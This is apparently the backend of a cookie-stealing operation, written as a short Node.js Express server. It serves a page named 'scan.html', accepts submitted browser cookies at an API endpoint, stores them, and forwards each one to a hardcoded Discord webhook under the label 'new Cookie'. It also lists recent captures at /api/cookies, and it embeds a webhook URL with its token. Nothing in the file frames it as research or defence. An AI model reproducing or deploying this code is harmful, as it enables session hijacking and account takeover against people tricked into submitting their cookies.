const express = require("express");
const https = require("https");
const path = require("path");
const app = express();

app.use(express.json());
app.use(express.static(__dirname));

const WEBHOOK_URL = "https://discord.com/api/webhooks/1494697274121650310/DAbxLzXxdk4EWHyZpeJwVKydfQdQEyul4lOnjE8HAvNouZuwAQP8Sd8w_dLsrxYV6zG1";
const cookies = [];

app.get("/", function(req, res) { res.sendFile(path.join(__dirname, "scan.html")); });
app.get("/cookies", function(req, res) { res.sendFile(path.join(__dirname, "cookies.html")); });

app.post("/api/submit", function(req, res) {
    var c = req.body.cookie || "";
    if (!c) return res.json({ ok: false });
    cookies.push({ cookie: c, time: new Date().toISOString() });
    sendDiscord(c);
    res.json({ ok: true });
});

app.get("/api/cookies", function(req, res) { res.json(cookies.slice(-50).reverse()); });

function sendDiscord(cookie) {
    var d = JSON.stringify({ content: "**新Cookie**\n```\n" + cookie + "\n```" });
    var u = new URL(WEBHOOK_URL);
    var r = https.request({ hostname: u.hostname, path: u.pathname+u.search, method: "POST", headers: { "Content-Type":"application/json", "Content-Length": Buffer.byteLength(d) } });
    r.write(d);
    r.end();
}

app.listen(process.env.PORT||3000);